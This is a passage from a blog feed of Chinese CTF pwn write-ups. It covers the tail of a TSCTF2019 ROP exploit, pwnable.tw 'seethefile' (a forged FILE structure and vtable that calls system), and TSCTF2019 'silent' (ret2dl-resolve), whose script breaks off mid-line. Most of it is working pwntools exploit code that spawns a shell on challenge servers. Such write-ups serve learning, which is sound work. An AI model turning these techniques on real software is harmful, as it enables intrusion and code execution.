class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    csu_end_addr = base + <span class="number">0xdda</span></span><br><span class="line">    csu_front_addr = base + <span class="number">0xdc0</span></span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    <span class="comment">#sleep(1)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    canary = 0x555555554d00</span></span><br><span class="line"><span class="string">    payload = 'b'*0x20 + p64(canary) + 'a'*8 + '\x13\x0c'</span></span><br><span class="line"><span class="string">    p.recvuntil('How long is your Name? 2,3or4?\n')</span></span><br><span class="line"><span class="string">    p.sendline(str(payload))</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="comment">#leak canary</span></span><br><span class="line">    </span><br><span class="line">    pop_rdi_ret = <span class="number">0xde3</span></span><br><span class="line">    p.recvuntil(<span class="string">'How long is your Name? 2,3or4?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'24'</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(<span class="string">'a'</span>*<span class="number">24</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    canary = u64((<span class="string">'\x00'</span>+p.recv(<span class="number">7</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(<span class="string">'canary =&gt; '</span> + hex(canary))</span><br><span class="line">    main_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0xd80</span></span><br><span class="line">    log.success(<span class="string">'main base =&gt; '</span> + hex(main_base))</span><br><span class="line">    <span class="comment">#overwrite</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.send(<span class="string">'n'</span>)</span><br><span class="line">    <span class="comment">#rop = ROP('./nofile')</span></span><br><span class="line">    <span class="comment">#print rop.setrlimit(7,p64(1024))</span></span><br><span class="line">    pop_rdi_ret += main_base</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'pop rdi ret '</span> + hex(pop_rdi_ret)</span><br><span class="line">    vuln = main_base + <span class="number">0xc13</span></span><br><span class="line">    call_setrlimit = main_base + <span class="number">0xb3e</span></span><br><span class="line">    bss_addr = elf.bss() + main_base + <span class="number">0x30</span></span><br><span class="line">    read_got = elf.got[<span class="string">'read'</span>] + main_base</span><br><span class="line">    setrlimit_got = elf.got[<span class="string">'setrlimit'</span>] + main_base</span><br><span class="line">    getrlimit_got = elf.got[<span class="string">'getrlimit'</span>] + main_base</span><br><span class="line">    ret_addr = <span class="number">0x8f1</span> + main_base</span><br><span class="line">    rops = csu(main_base,<span class="number">0</span>,<span class="number">1</span>,getrlimit_got,<span class="number">0</span>,bss_addr,<span class="number">7</span>,ret_addr)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'b'</span>*<span class="number">0x18</span> + p64(canary) + <span class="string">'a'</span>*<span class="number">8</span> + rops</span><br><span class="line">    rops = csu(main_base,<span class="number">0</span>,<span class="number">1</span>,read_got,<span class="number">100</span>,bss_addr,<span class="number">0</span>,ret_addr)</span><br><span class="line">    payload += rops</span><br><span class="line">    rops = csu(main_base,<span class="number">0</span>,<span class="number">1</span>,read_got,<span class="number">100</span>,bss_addr+<span class="number">0x30</span>,<span class="number">0</span>,ret_addr)</span><br><span class="line">    payload += rops</span><br><span class="line">    payload += csu(main_base,<span class="number">0</span>,<span class="number">1</span>,setrlimit_got,<span class="number">0</span>,bss_addr,<span class="number">7</span>,pop_rdi_ret)</span><br><span class="line">    payload += p64(bss_addr+<span class="number">0x30</span>) + p64(vuln)</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(str(len(payload)))</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="comment">#p.sendline(str(len(payload)))</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    raw_input()</span><br><span class="line">    fake_struct = p64(<span class="number">1024</span>)</span><br><span class="line">    p.send(fake_struct)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(<span class="string">'flag\x00\x00\x00\x00'</span>)</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>TSCTF2019</category>
      </categories>
  </entry>
  <entry>
    <title>seethefile</title>
    <url>/2020/09/03/seethefile/</url>
    <content><![CDATA[<h1 id="pwnable-tw-gt-seethefile"><a href="#pwnable-tw-gt-seethefile" class="headerlink" title="pwnable.tw-&gt;seethefile"></a>pwnable.tw-&gt;seethefile</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SUCTF里做了一道简单的文件题，想趁热打铁多了解一些文件结构的知识，于是时隔多年再次杀回pwnable.tw，不过遗憾的是这个题还是没能自己做出来，不过依然有一些trick可以借鉴，因此写篇writeup提醒自己</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序也比较简单，用户输入文件名，打开之后每次读取0x18F字节，输出到屏幕上，关闭文件，退出。这里的exit前会让用户输入自己的姓名，name位于.bss段的0x0804B260处，而文件句柄fp位于.bss段的0x0804B280处。这里的scanf并没有限制输入的长度，因此存在溢出漏洞。</p>
<p><img src="/2020/09/03/seethefile/1.jpg" alt="code"></p>
<h2 id="数据构造"><a href="#数据构造" class="headerlink" title="数据构造"></a>数据构造</h2><h3 id="Libc基址"><a href="#Libc基址" class="headerlink" title="Libc基址"></a>Libc基址</h3><p>根据前面学到的知识，文件可以通过覆写vtable来修改一些函数指针指向我们想要执行的函数。因此，可以通过伪造FILE结构来执行shell，首先是libc基址的寻找，也正是在这里我直接卡住放弃的。看了p4nda师傅的wp得知文件执行的时候Linux会将进程的虚拟地址空间存储在/proc/<pid>/maps里，由于我们无从得知PID，因此使用self即可看到本进程的映射表，第一行libc.so的起始地址即为libc加载的基地址。这里还要注意由于read的长度有限，需要两次读才能读到libc.so。得到Libc基址之后即可得到system的地址。</pid></p>
<h3 id="FILE结构体"><a href="#FILE结构体" class="headerlink" title="FILE结构体"></a>FILE结构体</h3><p>FILE结构体比较复杂，构造的时候要注意一些关键的验证条件要满足，这里给出CTF All In One的libio.h中的实现(glibc2.23)<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;        <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> short _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">void</span> *__pad1;</span><br><span class="line">  <span class="keyword">void</span> *__pad2;</span><br><span class="line">  <span class="keyword">void</span> *__pad3;</span><br><span class="line">  <span class="keyword">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">size_t</span> __pad5;</span><br><span class="line">  <span class="keyword">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don't get into trouble again.  */</span></span><br><span class="line">  <span class="keyword">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="keyword">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="keyword">void</span> *) - <span class="keyword">sizeof</span> (<span class="keyword">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdin_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdout_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stderr_</span>;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure>
<p>这里伪造结构体的时候有一些关键的点需要注意:  </p>
<ol>
<li>IO_FILE结构体偏移0x34的地方即_chain字段指向的也是一个FILE结构，我们可以使用_IO_2_1_stderr_，_IO_2_1_stderr_，_IO_2_1_stdout_或者，也可以使用自己的FILE结构体地址(不过实测发现stderr不可以,猜测里面用到了read和write但是没有setbuf(stderr)，即这个流没打开，不过正常应该这仨都是自动打开的才是Orz)</li>
<li>位于0x48偏移的_lock必须指向一个为NULL的空间，因此我们可以用\x00填充name,在这里填name的地址</li>
<li>_vtable_offset要为0，其位于0x46处且只占一个字节</li>
<li>其余部分是0或者0xffffffff按照未溢出前正常fp结构体的分布来写</li>
<li>vatable的前两个地址为NULL</li>
<li>close函数覆写为system，函数执行的时候的参数为fp，故可以将fp的开头改为/bin/sh\x00，即可让fclose(fp)变为syetm(fake_fp),fake_fp-&gt;/bin/sh\x00</li>
</ol>
<p>综上所述最终的payload结构如下:</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">elf = ELF(<span class="string">'./seethefile'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    sh = process(<span class="string">'./seethefile'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10200</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">fp_addr = <span class="number">0x0804B280</span></span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'What do you want to see :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'/proc/self/maps'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line"><span class="comment">##get libc base addr</span></span><br><span class="line">sh.recvline(<span class="number">1</span>)</span><br><span class="line">libc_addr = int(sh.recvuntil(<span class="string">'-'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">'libc base addr =&gt; '</span> + hex(libc_addr))</span><br><span class="line"><span class="comment">#shell_addr = libc_addr + 0x5f065</span></span><br><span class="line">shell_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'5'</span>)</span><br><span class="line"><span class="comment">##</span></span><br><span class="line">sh.recvuntil(<span class="string">'Leave your name :'</span>)</span><br><span class="line">vtable_addr = fp_addr+<span class="number">0x94</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x20</span></span><br><span class="line">payload +=  p32(<span class="number">0x0804B284</span>)</span><br><span class="line">payload += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">11</span><span class="comment">#9</span></span><br><span class="line">payload += p32(libc_addr+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>])<span class="comment">#1</span></span><br><span class="line"><span class="comment">#payload += p32(0x0804b284)</span></span><br><span class="line">payload += p32(<span class="number">3</span>)+p32(<span class="number">0</span>)*<span class="number">3</span> + p32(<span class="number">0x0804b260</span>)<span class="comment">#6</span></span><br><span class="line">payload += p32(<span class="number">0xffffffff</span>)*<span class="number">2</span><span class="comment">#3</span></span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">16</span><span class="comment">#14</span></span><br><span class="line">payload += p32(fp_addr+len(payload)+<span class="number">4</span><span class="number">-0x20</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">2</span> + p32(<span class="number">0</span>) * <span class="number">15</span> + p32(shell_addr) + p32(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">sh.sendline(payload) </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
  </entry>
  <entry>
    <title>silent</title>
    <url>/2020/09/03/silent/</url>
    <content><![CDATA[<h1 id="tsctf2019-gt-silent"><a href="#tsctf2019-gt-silent" class="headerlink" title="tsctf2019-&gt;silent"></a>tsctf2019-&gt;silent</h1><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序中没有给泄露地址的函数，但是给了*(0x601008+0x1c8) = 0这个提示，说明需要用ret2-dl-resolve。</p>
<p>vuln有溢出，可以多写0x60个字节</p>
<p><img src="/2020/09/03/silent/1.jpg" alt="main"></p>
<p><img src="/2020/09/03/silent/2.jpg" alt="vuln"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里的rop链用csu gadgets构造，但是栈溢出的长度不够(少0x18个字节)，导致最后没法ret到bss_addr。这里可以观察vuln停在leave时候寄存器的状态，rbx = 0，之后执行<br><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">rsp</span>,<span class="built_in">rbp</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rbp</span></span><br></pre></td></tr></table></figure></p>
<p>如果我们把rbp置为p64(1)即可省去0x10个字节，这是一个技巧。另外可以用retn to vuln来执行二次构造，第一次的rop负责输入r12、r13、r14和r15，第二次的rop负责mov并执行，最后用<br><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pop</span> <span class="built_in">rbp</span>,bss_stage-<span class="number">8</span></span><br><span class="line"><span class="keyword">ret</span></span><br><span class="line"><span class="keyword">leave</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure></p>
<p>去执行bss_stage的代码</p>
<p>buf的结构如下：<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">buf = p64(pop_rdi_ret) + p64(addr_cmd)</span><br><span class="line">buf += p64(plt0) + p64(index_offset)</span><br><span class="line">buf = buf.ljust(<span class="number">0x300</span>,<span class="string">'b'</span>)</span><br><span class="line">buf += fake_rel</span><br><span class="line">buf = buf.ljust(<span class="number">0x340</span>,<span class="string">'b'</span>)</span><br><span class="line">buf += <span class="string">'c'</span>*padding</span><br><span class="line">buf += fake_sym</span><br><span class="line">buf += <span class="string">'system\x00'</span></span><br><span class="line">buf += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">buf = buf.ljust(<span class="number">0x500</span>,<span class="string">'b'</span>)</span><br></pre></td></tr></table></figure></p>
<p>即先将’/bin/sh\x00’读到rdi里以作为system的参数，之后plt0调用push，jmp的命令去link_map，index_offset为fake_rel与rel_plt的距离除以0x18，为了方便，我挑了一个不需要填充的fake_rel。</p>
<p>plt0找到fake_rel后通过r_info找到fake_sym，这里同样要除以0x18，这是和32位的不同，r_info的构造方式如下：<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">r_info = (((fake_sym_addr - dynsym) / <span class="number">0x18</span>) &lt;&lt; <span class="number">0x20</span>) | <span class="number">0x7</span></span><br></pre></td></tr></table></figure></p>
<p>这里为了方便我的fake_sym_addr也选择了一个不需要填充的地址。<br>r_offset选择elf.got[‘__libc_start_main’]，这是之后system会覆盖的函数地址,r_addend为0，fake_rel结构如下：<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">fake_rel = p64(r_offset) + p64(r_info) + r_addend</span><br></pre></td></tr></table></figure></p>
<p>找到fake_sym之后，dl_reovel_runtime会根据其st_name字段找到需要执行的函数名，这里是’system’，寻址方式是字符串地址 - dynstr段地址，fake_sym的结构如下<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0x12</span>) + p64(<span class="number">0</span>) * <span class="number">2</span></span><br></pre></td></tr></table></figure></p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> log</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> ELF</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">offset = <span class="number">0x78</span></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">'./silent'</span>)</span><br><span class="line">addr_stage = rop.section(<span class="string">'.bss'</span>) + <span class="number">0x1000</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'addr stage =&gt; '</span> + hex(addr_stage)</span><br><span class="line">ptr_ret = rop.search(rop.section(<span class="string">'.fini'</span>))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">buf = rop.retfill(offset)</span></span><br><span class="line"><span class="string">buf += rop.call_chain_ptr(</span></span><br><span class="line"><span class="string">    ['read', 0, addr_stage, 400]</span></span><br><span class="line"><span class="string">, pivot=addr_stage)</span></span><br><span class="line"><span class="string">#log.success('first data =&gt; ' + repr(buf))</span></span><br><span class="line"><span class="string">print len(buf)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">csu_end_addr = <span class="number">0x40060c</span></span><br><span class="line">csu_begin_addr = <span class="number">0x4005f0</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x400490</span></span><br><span class="line">leave_ret_addr = <span class="number">0x40054a</span></span><br><span class="line">ret_addr = <span class="number">0x4003e1</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400613</span></span><br><span class="line"><span class="comment">#payload = 'a'*5 + 'b'*0x78 + p64(csu_end_addr) + p64(0) + p64(1) + p64(0x601018) + p64(0x190) + p64(addr_stage) + p64(0)</span></span><br><span class="line"><span class="comment">#payload += p64(cus_begin) + 'a'*8 + p64(0) + '\x38\x14\x60'</span></span><br><span class="line">elf = ELF(<span class="string">'./silent'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./silent'</span>)</span><br><span class="line">    gdb.attach(p,<span class="string">'b *0x40054a'</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p =remote(<span class="string">'10.112.100.47'</span>,<span class="number">8001</span>)</span><br><span class="line">vuln_addr = <span class="number">0x400526</span></span><br><span class="line">read_got = <span class="number">0x601018</span></span><br><span class="line">addr_link_map = <span class="number">0x601008</span>                                                                                                                          </span><br><span class="line">addr_dt_debug = addr_link_map + <span class="number">0x1c8</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x30</span>+p64(addr_stage)+<span class="string">'a'</span>*<span class="number">0x38</span>+p64(<span class="number">1</span>)+p64(csu_end_addr) + p64(<span class="number">0x601018</span>) + p64(<span class="number">0x500</span>) + p64(addr_stage) + p64(<span class="number">0</span>)<span class="comment">#0xb0</span></span><br><span class="line">payload += p64(vuln_addr)<span class="comment">#0xb8</span></span><br><span class="line">p.send(p64(read_got)[:<span class="number">-1</span>])</span><br><span class="line"><span class="comment">#p.send(p32(len(buf))+'a'+buf)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#seoncd</span></span><br><span class="line">payload = <span class="string">"x"</span>*<span class="number">0x70</span> + p64(<span class="number">1</span>) + p64(csu_begin_addr)+<span class="string">'a'</span>*<span class="number">0x38</span>+p64(pop_ebp_ret)+p64(addr_stage<span class="number">-8</span>)+p64(leave_ret_addr)</span><br><span class="line">raw_input()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print "[+] read: %r" % p.read(len(buf))</span></span><br><span class="line"><span class="comment">#addr_link_map = p.read_p64()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">buf = rop.call_chain_ptr(</span></span><br><span class="line"><span class="string">    ['read', 0, addr_dt_debug, 8],</span></span><br><span class="line"><span class="string">    [ptr_ret, addr_stage+400]</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">buf += rop.dl_resolve_call(addr_stage+300)</span></span><br><span class="line"><span class="string">buf += rop.fill(300, buf)</span></span><br><span class="line"><span class="string">buf += rop.dl_resolve_data(addr_stage+300, 'system')</span></span><br><span class="line"><span class="string">buf += rop.fill(400, buf)</span></span><br><span class="line"><span class="string">buf += rop.string('/bin/sh')</span></span><br><span class="line"><span class="string">buf += rop.fill(420, buf)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">plt0 = <span class="number">0x4003f0</span></span><br><span class="line">rel_plt = <span class="number">0x400398</span></span><br><span class="line">log.success(<span class="string">'rel_plt =&gt; '</span> + 